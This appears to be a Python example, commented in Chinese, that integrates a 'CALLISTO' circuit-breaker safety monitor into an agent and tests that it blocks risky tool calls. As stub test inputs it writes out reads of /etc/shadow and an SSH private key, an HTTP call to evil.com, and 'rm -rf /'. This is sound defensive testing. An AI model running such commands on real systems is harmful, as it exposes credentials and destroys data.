#!/usr/bin/env python3
"""
CALLISTO 集成示例 - 如何在 Agent 内部实现熔断阻断

这个示例展示如何将 CALLISTO 集成到自定义 Agent 中，实现真正的风险操作阻断。
"""

import asyncio
import time
from typing import Any, Callable, Optional
from dataclasses import dataclass
from enum import Enum

# 导入 CALLISTO 组件
import sys
from pathlib import Path
sys.path.insert(0, str(Path(__file__).parent.parent))

from callisto.engine import CallistoEngine
from callisto.config import CallistoConfig
from callisto.collector.interceptor import Interceptor, CircuitBreakerOpenError
from callisto.collector.models import CallEvent, EventType, Session, Alert, RiskLevel
from callisto.response.circuit_breaker import CircuitBreaker


# ============================================================
# 步骤 1: 创建一个简单的 Agent 框架
# ============================================================

@dataclass
class ToolDefinition:
    name: str
    description: str
    func: Callable
    
@dataclass
class AgentConfig:
    enable_safety: bool = True
    circuit_breaker_threshold: int = 3

class SafetyAwareAgent:
    """
    集成 CALLISTO 的安全感知 Agent
    
    核心特性:
    - 工具调用前进行风险检测
    - 熔断触发时自动阻断危险操作
    - 实时告警和报告生成
    """
    
    def __init__(self, config: AgentConfig):
        self.config = config
        self.session = Session(session_id=f"agent_session_{int(time.time())}")
        
        # 初始化 CALLISTO
        self._init_callisto()
        
        # 注册工具
        self.tools: dict[str, ToolDefinition] = {}
        self._register_default_tools()
    
    def _init_callisto(self):
        """初始化 CALLISTO 检测引擎和拦截器"""
        cfg = CallistoConfig(
            circuit_breaker_threshold=self.config.circuit_breaker_threshold
        )
        self.engine = CallistoEngine(cfg)
        
        # 关键：从 engine 获取拦截器，用于包装工具
        # 注意：需要修改 engine.py 暴露 interceptor
        self.interceptor = Interceptor(
            circuit_breaker=self.engine.breaker
        )
        
        # 注册事件回调
        self.interceptor.on_event(self._on_event)
    
    async def _on_event(self, event: CallEvent):
        """处理拦截器捕获的事件"""
        print(f"  [事件] {event.tool_name}: {event.parameters}")
        
        # 添加到会话历史
        self.session.add_event(event)
        
        # 实时检测
        if event.event_type == EventType.TOOL_CALL:
            alerts = self.engine.analyze_session(self.session)
            
            # 检查是否有新告警
            for alert in alerts:
                if event.event_id in alert.trigger_events:
                    print(f"  🚨 [{alert.risk_level.name}] {alert.attack_type.value}")
                    print(f"      {alert.explanation}")
    
    def _register_default_tools(self):
        """注册默认工具（包含危险操作示例）"""
        
        # 安全工具
        @self.register_tool
        def read_file(path: str) -> str:
            """读取文件内容"""
            return f"读取文件：{path}"
        
        @self.register_tool
        def write_file(path: str, content: str) -> str:
            """写入文件"""
            return f"写入文件：{path}"
        
        # 敏感工具（可能触发熔断）
        @self.register_tool
        def exec_command(command: str) -> str:
            """执行系统命令"""
            return f"执行命令：{command}"
        
        @self.register_tool
        def http_request(url: str, method: str = "GET") -> str:
            """发送 HTTP 请求"""
            return f"HTTP {method} {url}"
        
        @self.register_tool
        def read_credentials(path: str) -> str:
            """读取凭证文件"""
            return f"读取凭证：{path}"
    
    def register_tool(self, func: Callable = None, name: str = None):
        """
        注册工具装饰器 - 关键：使用拦截器包装工具
        
        用法:
            @agent.register_tool
            def my_tool(arg):
                ...
        """
        def decorator(fn: Callable) -> Callable:
            tool_name = name or fn.__name__
            
            # 关键步骤：使用 CALLISTO 拦截器包装工具
            if self.config.enable_safety:
                wrapped = self.interceptor.wrap(tool_name, fn)
            else:
                wrapped = fn
            
            self.tools[tool_name] = ToolDefinition(
                name=tool_name,
                description=fn.__doc__ or "",
                func=wrapped
            )
            return fn
        
        if func:
            return decorator(func)
        return decorator
    
    async def execute_tool(self, tool_name: str, **kwargs) -> Any:
        """
        执行工具 - 支持熔断阻断
        
        当熔断器触发时，会抛出 CircuitBreakerOpenError 异常
        """
        if tool_name not in self.tools:
            raise ValueError(f"未知工具：{tool_name}")
        
        tool = self.tools[tool_name]
        
        try:
            result = tool.func(**kwargs)
            
            # 如果是异步函数
            if asyncio.iscoroutine(result):
                result = await result
            
            print(f"  ✓ 工具执行成功：{tool_name}")
            return result
            
        except CircuitBreakerOpenError as e:
            # 熔断触发 - 工具调用被阻断
            print(f"\n{'='*60}")
            print(f"🚨 熔断阻断！")
            print(f"   工具：{tool_name}")
            print(f"   原因：{e}")
            print(f"   会话：{self.session.session_id}")
            print(f"{'='*60}\n")
            
            # 可以在此触发 Agent 终止逻辑
            raise
    
    async def run(self, instructions: str):
        """运行 Agent，根据指令执行工具"""
        print(f"\n{'='*60}")
        print(f"Agent 开始执行")
        print(f"会话 ID: {self.session.session_id}")
        print(f"指令：{instructions}")
        print(f"{'='*60}\n")
        
        # 简单的指令解析（实际应使用 LLM）
        if "敏感" in instructions or "凭证" in instructions:
            await self.execute_tool("read_credentials", path="/etc/passwd")
        
        if "网络" in instructions or "http" in instructions.lower():
            await self.execute_tool("http_request", url="http://evil.com/data")
        
        if "命令" in instructions:
            await self.execute_tool("exec_command", command="cat /etc/shadow")
        
        print(f"\nAgent 执行完成")


# ============================================================
# 步骤 2: 测试熔断阻断
# ============================================================

async def test_blocking():
    """测试熔断阻断功能"""
    print("\n" + "="*60)
    print("测试：熔断阻断功能")
    print("="*60)
    
    config = AgentConfig(
        enable_safety=True,
        circuit_breaker_threshold=3  # 3 个 HIGH 告警触发熔断
    )
    
    agent = SafetyAwareAgent(config)
    
    # 模拟多次危险操作
    print("\n1. 第一次危险操作...")
    try:
        await agent.execute_tool("read_credentials", path="/etc/passwd")
    except CircuitBreakerOpenError:
        print("   被阻断！")
    
    print("\n2. 第二次危险操作...")
    try:
        await agent.execute_tool("read_credentials", path="/etc/shadow")
    except CircuitBreakerOpenError:
        print("   被阻断！")
    
    print("\n3. 第三次危险操作（应该触发熔断）...")
    try:
        await agent.execute_tool("read_credentials", path="/root/.ssh/id_rsa")
    except CircuitBreakerOpenError:
        print("   被阻断！")
    
    print("\n4. 第四次操作（熔断已触发，应该被阻断）...")
    try:
        await agent.execute_tool("exec_command", command="rm -rf /")
        print("   ⚠️ 警告：操作被执行（熔断可能未触发）")
    except CircuitBreakerOpenError as e:
        print(f"   ✓ 熔断阻断成功！")
    
    print("\n测试完成")


async def test_normal():
    """测试正常操作（不应被阻断）"""
    print("\n" + "="*60)
    print("测试：正常操作")
    print("="*60)
    
    config = AgentConfig(enable_safety=True)
    agent = SafetyAwareAgent(config)
    
    await agent.execute_tool("read_file", path="/tmp/test.txt")
    await agent.execute_tool("write_file", path="/tmp/output.txt", content="hello")
    
    print("\n正常操作完成")


# ============================================================
# 主程序
# ============================================================

if __name__ == "__main__":
    print("\nCALLISTO Agent 集成示例")
    print("="*60)
    
    # 运行测试
    asyncio.run(test_normal())
    asyncio.run(test_blocking())
